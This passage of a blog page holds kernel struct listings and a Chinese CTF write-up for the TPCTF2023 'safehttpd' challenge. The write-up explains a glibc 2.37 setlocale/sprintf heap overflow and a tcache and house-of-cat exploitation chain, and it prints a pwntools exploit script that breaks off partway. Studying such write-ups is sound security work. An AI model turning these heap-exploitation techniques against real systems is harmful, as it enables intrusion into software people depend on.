class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* read start from len to offset, write start from offset */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment">	 * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment">	 * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment">	 * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment">	 * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment">	 * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment">	 * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment">	 * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment">	 * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment">	 * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment">	 * cache.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/03/TPCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/03/TPCTF2023/" class="post-title-link" itemprop="url">TPCTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-12-03 19:00:25 / Modified: 19:03:40" itemprop="dateCreated datePublished" datetime="2023-12-03T19:00:25+08:00">2023-12-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>28k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>26 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="safehttpd"><a href="#safehttpd" class="headerlink" title="safehttpd"></a>safehttpd</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.37</span><span class="number">-0u</span>buntu1)</span> stable release version 2.37.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">httpd: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=eaa5ba1189be005fab91f8b22ca2d02415cb5faa, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>由 setlocale 引发的 sprintf 堆溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setlocale(LC_ALL, v3 + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chunk = (Chunk *)<span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">chunk-&gt;data = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">memset</span>(chunk-&gt;data, <span class="number">0</span>, size);</span><br><span class="line">chunk-&gt;size = size;</span><br><span class="line"><span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;chunk-&gt;info, <span class="string">&quot;%-8s:%-13s:%-&#x27;8d&quot;</span>, name, pswd, uid);</span><br></pre></td></tr></table></figure>
<ul>
<li>本题目 libc 版本为 2.37-0ubuntu1 刚好存在此漏洞</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>题目有两次泄露的机会，先构造大量的 fast chunk，然后利用 fastbin 合并机制生成一个 unsorted chunk，利用 <code>GET /init</code> 功能不会置空 chunk 的特点可以用于泄露 libc_base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    register(i,<span class="number">64</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1f</span>):</span><br><span class="line">    logoff(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">register(<span class="number">1</span>,<span class="number">1024</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;GET /init&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line">payload = <span class="string">&quot;Stdout: 3&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">seed = lib.time(<span class="number">0</span>)</span><br><span class="line">lib.srand(seed)</span><br><span class="line">pswd = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    num = lib.rand() % <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">while</span>(num &gt;= <span class="number">0x7f</span> <span class="keyword">or</span> num &lt;= <span class="number">0x20</span>):</span><br><span class="line">        num = lib.rand() % <span class="number">0x100</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(num))</span><br><span class="line">    pswd += <span class="built_in">chr</span>(num)</span><br><span class="line">success(pswd)</span><br><span class="line"></span><br><span class="line">show(<span class="string">&quot;root&quot;</span>,pswd,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Content-type: text/html&quot;</span>)</span><br><span class="line">leak_addr = u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))+<span class="number">0x7f</span>*<span class="number">0x10000000000</span></span><br><span class="line">libc_base = leak_addr - <span class="number">0x1f72d0</span> </span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>另外利用 <code>passwd=&quot;a:0&quot;</code> 可以绕过如下的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">check</span><span class="params">(<span class="keyword">char</span> *uid, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( uid[i] &gt; <span class="number">0x2F</span> &amp;&amp; uid[i] &lt;= <span class="number">0x39</span> )</span><br><span class="line">      v3 = <span class="number">10</span> * v3 + uid[i] - <span class="number">0x30</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来利用漏洞就可以使 sprintf 造成一字节的堆溢出，覆盖后续指针的末尾一字节为 <code>\x00</code>，进而释放一片正在使用的区域</p>
<p>利用堆风水可以释放一个正在使用的 info chunk(0x51)，然后将其申请回来就可以使 new info chunk(0x51) 两次出现在循环链表中</p>
<ul>
<li>一次源自于覆写 info chunk(0x51) 为 new info chunk(0x51)</li>
<li>另一次则是 new info chunk(0x51) 本身的插链</li>
</ul>
<p>最后利用 UAF 劫持 tcache，申请并伪造 <code>_IO_list_all</code> 打 house fo cat 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./httpd1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">lib = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./debug/\n&quot;</span></span><br><span class="line"><span class="comment">#b += &quot;b *$rebase(0x353A)\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;122.9.149.82&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x357C)\nb *$rebase(0x353A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">uid,<span class="built_in">len</span>,name,passwd=<span class="string">&quot;a&quot;</span></span>):</span></span><br><span class="line">    payload = <span class="string">&quot;GET /register?uid=&#123;&#125;&amp;len=&#123;&#125;)&amp;username=&#123;&#125;&amp;password=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(uid,<span class="built_in">str</span>(<span class="built_in">len</span>),name,passwd)</span><br><span class="line">    sl(payload)</span><br><span class="line">    payload = <span class="string">&quot;Stdout: 3&quot;</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    sl(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logoff</span>(<span class="params">name,passwd=<span class="string">&quot;a&quot;</span></span>):</span></span><br><span class="line">    payload = <span class="string">&quot;GET /logoff?username=&#123;&#125;&amp;password=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(name,passwd)</span><br><span class="line">    sl(payload)</span><br><span class="line">    payload = <span class="string">&quot;Stdout: 3&quot;</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    sl(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">name,passwd,fd</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;GET /show?username=&#123;&#125;&amp;password=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(name,passwd)</span><br><span class="line">    sl(payload)</span><br><span class="line">    payload = <span class="string">&quot;Stdout: &quot;</span>+<span class="built_in">str</span>(fd)</span><br><span class="line">    sl(payload)</span><br><span class="line">    sl(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setlocale_s</span>(<span class="params">locale_setting</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;GET /setlocale?locale=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(locale_setting)</span><br><span class="line">    sl(payload)</span><br><span class="line">    sl(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">note</span>(<span class="params">name,passwd,buffer,size</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;POST /note?username=&#123;&#125;&amp;password=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(name,passwd)</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">&quot;Content-Length: &quot;</span>+<span class="built_in">str</span>(size)</span><br><span class="line">    sl(payload)</span><br><span class="line">    sl(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    pause()</span><br><span class="line">    p.send(buffer)</span><br><span class="line">    </span><br><span class="line">backdook = <span class="number">0x2562</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    register(i,<span class="number">64</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1f</span>):</span><br><span class="line">    logoff(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">register(<span class="number">1</span>,<span class="number">1024</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;GET /init&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line">payload = <span class="string">&quot;Stdout: 3&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">seed = lib.time(<span class="number">0</span>)</span><br><span class="line">lib.srand(seed)</span><br><span class="line">pswd = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i 